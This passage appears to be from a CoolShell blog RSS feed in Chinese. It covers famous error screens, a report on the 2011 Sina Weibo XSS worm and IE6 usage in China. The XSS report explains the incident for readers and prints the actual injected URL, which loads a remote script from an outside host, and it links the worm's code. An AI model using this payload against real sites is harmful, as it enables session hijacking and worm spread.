+<figure id="attachment_5109" aria-describedby="caption-attachment-5109" style="width: 512px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5109  " title="Longhorn RSoD" src="https://coolshell.cn/wp-content/uploads/2011/08/Longhorn_RSoD.png" alt="" width="512" height="320" srcset="https://coolshell.cn/wp-content/uploads/2011/08/Longhorn_RSoD.png 640w, https://coolshell.cn/wp-content/uploads/2011/08/Longhorn_RSoD-300x187.png 300w" sizes="(max-width: 512px) 100vw, 512px" /><figcaption id="caption-attachment-5109" class="wp-caption-text">Windows Vista 的 RSoD</figcaption></figure>
+<p><span id="more-5107"></span></p>
+<figure id="attachment_5110" aria-describedby="caption-attachment-5110" style="width: 480px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5110" title="PSP的红屏" src="https://coolshell.cn/wp-content/uploads/2011/08/Rsodhc6.png" alt="" width="480" height="272" srcset="https://coolshell.cn/wp-content/uploads/2011/08/Rsodhc6.png 480w, https://coolshell.cn/wp-content/uploads/2011/08/Rsodhc6-300x170.png 300w" sizes="(max-width: 480px) 100vw, 480px" /><figcaption id="caption-attachment-5110" class="wp-caption-text">PSP的红屏</figcaption></figure>
+<h4>8、PC机的开机报警</h4>
+<p>攒过PC的朋友都知道如果你的内存条有问题，PC开机时会长鸣报警，一长一短则是显卡有问题，等等。你可以上Wikipedia上看看相关的词条——<a href="http://en.wikipedia.org/wiki/Power-on_self_test">Power On Self-Test Beep</a>。</p>
+<figure id="attachment_5111" aria-describedby="caption-attachment-5111" style="width: 400px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5111" title="AMI BIOS " src="https://coolshell.cn/wp-content/uploads/2011/08/POST_P5KPL.jpg" alt="" width="400" height="317" srcset="https://coolshell.cn/wp-content/uploads/2011/08/POST_P5KPL.jpg 400w, https://coolshell.cn/wp-content/uploads/2011/08/POST_P5KPL-300x237.jpg 300w" sizes="(max-width: 400px) 100vw, 400px" /><figcaption id="caption-attachment-5111" class="wp-caption-text">第一代的AMI BIOS</figcaption></figure>
+<h4>7、Twitter的大鲸鱼</h4>
+<p>Twitter的服务器负载一吃紧，下面的这个页面就会显现出来了，大家把它叫做<strong>Fail Whale </strong>，这个情况在今年4月份以前的2到3年是非常频繁发生的，现在看似好很多了，看来Twitter工程师们克服了这个负载问题。你千万不要以为这个图是Twitter自己设计的，这个图是一个叫<a href="http://www.google.com/search?q=yiying+lu&amp;ie=utf-8&amp;oe=utf-8&amp;aq=t&amp;rls=FlockInc.:en-US:unofficial&amp;client=firefox">Yiying Lu</a>的人设计的。不过由Twitter引发出来的文化影响力是比较深远的，甚至还出现了相要把这个事发扬光大的Fail Whale project (<a href="http://www.twitter.com/failwhale">@FailWhale</a>, <a href="http://www.failwhale.com/">failwhale.com</a>)以及相关的T恤衫。你可以看看<a href="http://www.readwriteweb.com/archives/the_story_of_the_fail_whale.php" target="_blank">这篇文章</a>。</p>
+<figure id="attachment_5112" aria-describedby="caption-attachment-5112" style="width: 511px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5112 " title="Twitter Fail Whale" src="https://coolshell.cn/wp-content/uploads/2011/08/FailWhale.png" alt="" width="511" height="375" srcset="https://coolshell.cn/wp-content/uploads/2011/08/FailWhale.png 639w, https://coolshell.cn/wp-content/uploads/2011/08/FailWhale-300x220.png 300w" sizes="(max-width: 511px) 100vw, 511px" /><figcaption id="caption-attachment-5112" class="wp-caption-text">Twitter Fail Whale</figcaption></figure>
+<h4>6、Kernel Panic</h4>
+<p>Kernel Panic相关于Windows 的蓝屏错误，其发生在Mac OS X和Linux下，在Mac OS X v10.6 <em>Snow Leopard</em>中，当进入内核错误后，会在画面上出现一个有英语、法语、德语、西班牙语及日语的当机画面，被多数用户称为“五国语言当机”，简称“五国”。在Linux上则是Linux Kernel oops。当内核检测到问题时，它会打印一个oops信息然后杀死全部相关进程。oops信息可以帮助Linux内核工程师调试，检测oops出现的条件，并修复导致oops的程序错误。</p>
+<figure id="attachment_5113" aria-describedby="caption-attachment-5113" style="width: 460px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5113" title="Mac OS X 10.6的内核错误警告，俗称“五国”" src="https://coolshell.cn/wp-content/uploads/2011/08/Panic10.6.png" alt="" width="460" height="285" srcset="https://coolshell.cn/wp-content/uploads/2011/08/Panic10.6.png 460w, https://coolshell.cn/wp-content/uploads/2011/08/Panic10.6-300x185.png 300w" sizes="(max-width: 460px) 100vw, 460px" /><figcaption id="caption-attachment-5113" class="wp-caption-text">Mac OS X 10.6的内核错误警告，俗称“五国”</figcaption></figure>
+<figure id="attachment_5114" aria-describedby="caption-attachment-5114" style="width: 480px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5114 " title="Linux-2.6-oops-parisc" src="https://coolshell.cn/wp-content/uploads/2011/08/Linux-2.6-oops-parisc.jpg" alt="" width="480" height="480" srcset="https://coolshell.cn/wp-content/uploads/2011/08/Linux-2.6-oops-parisc.jpg 600w, https://coolshell.cn/wp-content/uploads/2011/08/Linux-2.6-oops-parisc-150x150.jpg 150w, https://coolshell.cn/wp-content/uploads/2011/08/Linux-2.6-oops-parisc-300x300.jpg 300w" sizes="(max-width: 480px) 100vw, 480px" /><figcaption id="caption-attachment-5114" class="wp-caption-text">PA-RISC上发生的Linux内核oops，用ASCII显示一头死牛</figcaption></figure>
+<h4>5、Windows的非法操作</h4>
+<p>这个错误信息主要是操作系统用来保护自己的错误，也就是Windows下的程序crash。通常来说，是内存访问错误引发的。不过，这个东西在windows下太多了，这是Win95和Win98中的大量的问题，包括微软自己的软件也经常出现这个问题，最为典型的就是IE6的crash。让IE6 出现这样的错误真是太简单了，参看<a title="一个jQuery的插件" href="https://coolshell.cn/articles/2357.html" target="_blank">酷壳的这篇文章</a>。</p>
+<figure id="attachment_5115" aria-describedby="caption-attachment-5115" style="width: 398px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5115" title="该程序执行了非法操作" src="https://coolshell.cn/wp-content/uploads/2011/08/gag_screenshot.gif" alt="" width="398" height="135" srcset="https://coolshell.cn/wp-content/uploads/2011/08/gag_screenshot.gif 398w, https://coolshell.cn/wp-content/uploads/2011/08/gag_screenshot-300x101.gif 300w" sizes="(max-width: 398px) 100vw, 398px" /><figcaption id="caption-attachment-5115" class="wp-caption-text">该程序执行了非法操作</figcaption></figure>
+<h4>4、Windows RPC Error</h4>
+<p>这个错误之所以很牛，是因为在2003年的8月份，很多使用Windows的用户都看到了这个错误，其系统被强行重启，重启了以后又收到这个错误，然后又被重启。这个事看上去就像一个正常的Windows的错误（相当正常，因为这样的红叉叉在Windows上看到了N多次了，用户都习惯了），但其实，这个事是有人故意的，这就是那个著名的<a href="http://en.wikipedia.org/wiki/Blaster_(computer_worm)">Blaster worm</a>蠕虫病毒，其利用了Windows DCOM的一个漏洞。</p>
+<figure id="attachment_5116" aria-describedby="caption-attachment-5116" style="width: 282px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5116" title="Windows RPC Error" src="https://coolshell.cn/wp-content/uploads/2011/08/Windows-RPC-Error.jpg" alt="" width="282" height="258" /><figcaption id="caption-attachment-5116" class="wp-caption-text">Windows RPC Error</figcaption></figure>
+<h4>3、Xbox 360 三红错误</h4>
+<p>这个错误又叫RRoD &#8211; Red Ring of Death，在中国地区叫“三红”。微软在推出的游戏主机Xbox360后，众多用户曾向微软方面投诉游戏主机经常出现不同程度的故障，而且概率偏高，有调查显示，早期版本Xbox360返修率高达68% ，而最近的报告指出故障机率还是有33%。过热是游戏配件产品制造商Nyko认为Xbox360主机发生三红灯警告的主要原因，也有人指出因为Xbox 360机能不足所以长期开机超频引致过热。<a href="http://www.bloomberg.com/apps/news?pid=newsarchive&amp;sid=aOrvYZ2gPwZk&amp;refer=home" target="_blank">有报告指出</a>微软花费了超过11.5亿美元在回收及修理出现问题的XBOX 360。</p>
+<figure id="attachment_5118" aria-describedby="caption-attachment-5118" style="width: 455px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5118" title="XBox 360 Red Ring of Death" src="https://coolshell.cn/wp-content/uploads/2011/08/XBox-Red-Ring-of-Death.jpg" alt="" width="455" height="341" srcset="https://coolshell.cn/wp-content/uploads/2011/08/XBox-Red-Ring-of-Death.jpg 455w, https://coolshell.cn/wp-content/uploads/2011/08/XBox-Red-Ring-of-Death-300x224.jpg 300w" sizes="(max-width: 455px) 100vw, 455px" /><figcaption id="caption-attachment-5118" class="wp-caption-text">XBox 360 Red Ring of Death</figcaption></figure>
+<h4 style="text-align: left;">2、Web上的404错误</h4>
+<p style="text-align: left;">HTTP 404或Not Found错误讯息是HTTP的其中一种“标准回应讯息”（HTTP状态码），此讯息代表客户端在浏览网页时，服务器无法打到用户要请求的资源，所以报错。404是一个你无法避免的错误，因为可能是因为用户或你的开发人员编码里打错连接。所以，很多公司借用这个机会来美化404页面，本站以前也介绍过（如：<a title="StackOverflow的404错误页" href="https://coolshell.cn/articles/2529.html" target="_blank">StackOverflow的404</a>，<a title="几个有趣的404错误页面" href="https://coolshell.cn/articles/1826.html" target="_blank">各式各样的404错</a>），这里还有一个404的一首诗：</p>
+<blockquote>
+<p style="text-align: left;">four oh four<br />
+by mind21_98</p>
+<p>oh what a wonderful tizzy<br />
+which was in a fizzy<br />
+he couldn&#8217;t find the file<br />
+which was hiding in the bushes</p>
+<p>push the back button oh traveller<br />
+contact the owner of the last tavern<br />
+find out how to get to where you&#8217;re going<br />
+and be on your way</p></blockquote>
+<h4 style="text-align: left;">1、Windows 蓝屏错误</h4>
+<p style="text-align: left;"><a href="http://en.wikipedia.org/wiki/Blue_Screen_of_Death" target="_blank">Blue Screen of Death</a>，缩写为：<strong>BSoD</strong>。这是这个世界最著名的错误了，和Kernel Panic 一样，基本上就是说，内核死翘翘了。在各种场合上我们都能看到这个错误。</p>
+<figure id="attachment_5119" aria-describedby="caption-attachment-5119" style="width: 535px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5119" title="北京2008奥林匹克" src="https://coolshell.cn/wp-content/uploads/2011/08/bjolympics.png" alt="" width="535" height="368" srcset="https://coolshell.cn/wp-content/uploads/2011/08/bjolympics.png 535w, https://coolshell.cn/wp-content/uploads/2011/08/bjolympics-300x206.png 300w" sizes="(max-width: 535px) 100vw, 535px" /><figcaption id="caption-attachment-5119" class="wp-caption-text">北京2008奥林匹克</figcaption></figure>
+<figure id="attachment_5120" aria-describedby="caption-attachment-5120" style="width: 535px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5120" title="飞机场航班显示" src="https://coolshell.cn/wp-content/uploads/2011/08/bsodairport.png" alt="" width="535" height="400" srcset="https://coolshell.cn/wp-content/uploads/2011/08/bsodairport.png 535w, https://coolshell.cn/wp-content/uploads/2011/08/bsodairport-300x224.png 300w" sizes="(max-width: 535px) 100vw, 535px" /><figcaption id="caption-attachment-5120" class="wp-caption-text">飞机场航班显示</figcaption></figure>
+<figure id="attachment_5121" aria-describedby="caption-attachment-5121" style="width: 535px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5121" title="商场显示屏" src="https://coolshell.cn/wp-content/uploads/2011/08/bsodbay.png" alt="" width="535" height="359" srcset="https://coolshell.cn/wp-content/uploads/2011/08/bsodbay.png 535w, https://coolshell.cn/wp-content/uploads/2011/08/bsodbay-300x201.png 300w" sizes="(max-width: 535px) 100vw, 535px" /><figcaption id="caption-attachment-5121" class="wp-caption-text">商场显示屏</figcaption></figure>
+<p>Bill Gates在Win98发布会上的蓝屏遭遇：</p>
+<p><center><embed src="http://www.tudou.com/v/eISuBfkMxlo/v.swf" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" wmode="opaque" width="480" height="400"></embed></center></p>
+<p>&nbsp;</p>
+<p>本来文章到这里就可以结束了，上文参考自这里<a href="http://technologizer.com/2008/09/18/errormessage" target="_blank">The 13 Greatest Error Message of All Time</a>。不过，我觉得还有一个错误必然会载入史册。这就是下面的“该页无法显示错误”</p>
+<h4>0、该页无法显示错误</h4>
+<p>这个错误对于中国用户不会陌生。这个错误以前更多的是Connection Reset，N年前你访问很多国外的网站者会遇到Connection Reset错，今天呢，更多的是“Time Out”，因为，关键词匹配太耗性能了，图片和视频的无法使用关键词过滤，所以，还不如直接封了IP，简单而粗暴，今天的Connection Reset更多的是出现在使用Google的搜索，当你搜某些关键词时就出这个错了。</p>
+<figure id="attachment_5122" aria-describedby="caption-attachment-5122" style="width: 593px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-5122" title="该页无法显示 Connection Reset" src="https://coolshell.cn/wp-content/uploads/2011/08/connection-reset.png" alt="" width="593" height="365" srcset="https://coolshell.cn/wp-content/uploads/2011/08/connection-reset.png 593w, https://coolshell.cn/wp-content/uploads/2011/08/connection-reset-300x184.png 300w" sizes="(max-width: 593px) 100vw, 593px" /><figcaption id="caption-attachment-5122" class="wp-caption-text">该页无法显示 Connection Reset</figcaption></figure>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg" alt="性能调优攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a></li><li ><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/25.jpg" alt="如何学好C语言" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_title">如何学好C语言</a></li><li ><a href="https://coolshell.cn/articles/4077.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="纯文本配置还是注册表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4077.html" class="wp_rp_title">纯文本配置还是注册表</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/1998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/operatingsystems-fanboys-150x150.jpg" alt="粉丝眼中的操作系统" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1998.html" class="wp_rp_title">粉丝眼中的操作系统</a></li><li ><a href="https://coolshell.cn/articles/1579.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/10/operating-systems-150x150.jpg" alt="一张关于操作系统的图" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1579.html" class="wp_rp_title">一张关于操作系统的图</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/5107.html">10大经典错误</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/5107.html/feed</wfw:commentRss>
+			<slash:comments>47</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>新浪微博的XSS攻击</title>
+		<link>https://coolshell.cn/articles/4914.html</link>
+					<comments>https://coolshell.cn/articles/4914.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 28 Jun 2011 15:10:18 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[业界新闻]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Sina]]></category>
+		<category><![CDATA[Weibo]]></category>
+		<category><![CDATA[XSS]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4914</guid>
+
+					<description><![CDATA[<p>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4914.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4914.html">新浪微博的XSS攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。</p>
+<p>事件的经过线索如下：</p>
+<ul>
+<li>20:14，开始有大量带V的认证用户中招转发蠕虫</li>
+<li>20:30，2kt.cn中的病毒页面无法访问</li>
+<li>20:32，新浪微博中hellosamy用户无法访问</li>
+<li>21:02，新浪漏洞修补完毕</li>
+</ul>
+<p style="text-align: center;">&nbsp;</p>
+<figure id="attachment_4915" aria-describedby="caption-attachment-4915" style="width: 583px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-4915 " title="新浪微博XSS事件" src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01.png" alt="新浪微博XSS事件" width="583" height="148" srcset="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01.png 729w, https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-300x76.png 300w, https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-604x153.png 604w" sizes="(max-width: 583px) 100vw, 583px" /><figcaption id="caption-attachment-4915" class="wp-caption-text">新浪微博XSS事件</figcaption></figure>
+<p style="text-align: left;">&nbsp;</p>
+<p style="text-align: left;">在这里，想和大家介绍一下XSS攻击，XSS攻击又叫跨站脚本式攻击，你Google一下可以搜到很多很多的文章。我在这里就简单地说一下。</p>
+<p style="text-align: left;"><span id="more-4914"></span></p>
+<p style="text-align: left;">首先，我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。这就是XSS攻击的最基本思路。</p>
+<p style="text-align: left;">再说一点，不一定是“记住你的用户名和密码”或是“自动登录”的方法，因为HTTP是无状态的协议，所以，几乎所有的网站都会在你的浏览器上设置cookie来记录状态，以便在其多个网页切换中检查你的登录状态。而现在的浏览器的运行方式是多页面或多窗口运行，也就是说，你在同一个父进程下开的多个页面或窗口里都可以无偿和共享使用你登录状态的。</p>
+<p style="text-align: left;">当然，你不必过于担心访问别的网站，在别的网站里的js代码会自动访问你的微博或是网银。因为浏览器的安全性让js只能访问自己所在网站的资源（你可以引入其它网站的js）。当然，这是浏览器对js做的检查，所以，浏览器并不一定会做这个检查，这就是为什么<a title="中国仍是IE6的重灾区" href="https://coolshell.cn/articles/3921.html" target="_blank">IE6是史上最不安全的浏览器</a>，没有之一。只要你没有在用IE6，应该没有这些问题。</p>
+<p style="text-align: left;">XSS攻击有两种方法，</p>
+<ul>
+<li>一种就像SQL Injection或CMD Injection攻击一样，我把一段脚本注入到服务器上，用户访问方法服务器的某个URL，这个URL就会把远端的js注入进来，这个js有可能自动进行很多操作。比如这次事件中的帮你发微博，帮你发站内消息等。注入有很多方法，比如：提交表单，更改URL参数，上传图片，设置签名，等等。</li>
+</ul>
+<ul>
+<li>另一类则是来来自外部的攻击，主要指的自己构造XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如 社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低，至少ajax 要发起跨站调用是非常困难的（你可能需要hack浏览器）。</li>
+</ul>
+<p>这次新浪微博事件是第一种，其利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入了js脚本，其通过http://163.fm/PxZHoxn短链接服务，将链接指向：</p>
+<p style="text-align: left; padding-left: 30px;">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</p>
+<p style="text-align: left;">注意，上面URL链接中的其实就是&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;。</p>
+<p style="text-align: left;">攻击者并不一定是2kt.cn的人，因为.cn被国家严格管制（大家不知道coolshell.cn 的备案备了不知有多少次），所以，我个人觉得这个人不会愚蠢到用自己域名来做攻击服务器。</p>
+<h4 style="text-align: left;">其它</h4>
+<ul>
+<li>初步发现 Chrome 和 Safari 都没中招。IE、Firefox未能幸免。</li>
+<li>史上最著名的XSS攻击是Yahoo Mail 的<a href="http://en.wikipedia.org/wiki/Yamanner" target="_blank">Yamanner </a>蠕虫是一个著名的XSS 攻击实例。早期Yahoo Mail 系统可以执行到信件内的javascript 代码。并且Yahoo Mail 系统使用了Ajax技术，这样病毒javascript 可以的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送攻击代码给他人。</li>
+<li>为什么那个用户叫hellosamy，因为<a href="http://en.wikipedia.org/wiki/Samy_(XSS)" target="_blank">samy</a>是第一个XSS攻击性的蠕虫病毒，在MySpace上传播。</li>
+<li>关于攻击的代码在这里：<a href="https://coolshell.cn/wp-content/uploads/2011/06/06.28_sina_XSS.txt.zip">06.28_sina_XSS.txt</a> （编码风格还是很不错的）</li>
+</ul>
+<p style="text-align: left;">（全文完）</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="国内微博和Twitter的最大不同" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li><li ><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg" alt="程序员疫苗：代码注入" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a></li><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4914.html">新浪微博的XSS攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4914.html/feed</wfw:commentRss>
+			<slash:comments>244</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>中国仍是IE6的重灾区</title>
+		<link>https://coolshell.cn/articles/3921.html</link>
+					<comments>https://coolshell.cn/articles/3921.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 10 Mar 2011 00:41:05 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[IE]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=3921</guid>
+
+					<description><![CDATA[<p>“IE6于10年前诞生，现在应该是我们同IE6告别的时候了。”微软公司日前推出IE6倒计时网站（the Internet Explorer 6 Countdow...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/3921.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/3921.html">中国仍是IE6的重灾区</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>“IE6于10年前诞生，现在应该是我们同IE6告别的时候了。”微软公司日前推出IE6倒计时网站（the Internet Explorer 6 Countdown，网址为<span style="color: #0066cc;"><a href="http://www.ie6countdown.com/" target="_blank">www.ie6countdown.com</a></span>），旨在尽早淘汰IE6，让用户升级到新版IE浏览器。</p>
+<p>值得注意一点的是，在这张百分比图上所显示的目前仍在使用IE6浏览器上网的百分比第一的是中国——34.5%，这个符合我国国情——什么都要争第一。我国人口世界第一占全世界1/4，网民也是世界第一，还在使用IE6的网民占全世界的1/3，可以我国网民的严重落后。根据<a href="http://www.cnnic.net.cn/dtygg/dtgg/201101/t20110118_20250.html" target="_blank">CNNIC今年的报告</a>，我国现有4.5亿网民，34%也就是1.5亿用户，也就是说你身边每三个人中就有一个在用IE6。而中国的IE6网民占全世界使用IE6网民的一半。</p>
+<p>另外，我发现亚洲是重灾区啊，包括中日韩台印都很猛啊，看来微软在亚洲的营销的确不错。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-3922" title="IE6 Countdown" src="https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown.png" alt="" width="495" height="365" srcset="https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown.png 495w, https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown-300x221.png 300w, https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown-366x270.png 366w" sizes="(max-width: 495px) 100vw, 495px" /></p>
+<p>我查看了一下Coolshell.cn的2011年到今天为止访问统计，排名第一是的Chrome(41.5%)，第二位的是Firefox(23.22%)，第三位的是IE8(10.7%)，第四位的是IE6(4.8%)。IE6的IP数有6400+。</p>
+<p>看来，在我国程序员这个人群中，越来越多的人使用Chrome+Firefox，挺喜人的，但是IE6还有4.8%，还不如土耳其，马来西亚，印尼等国家。<br />
+<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
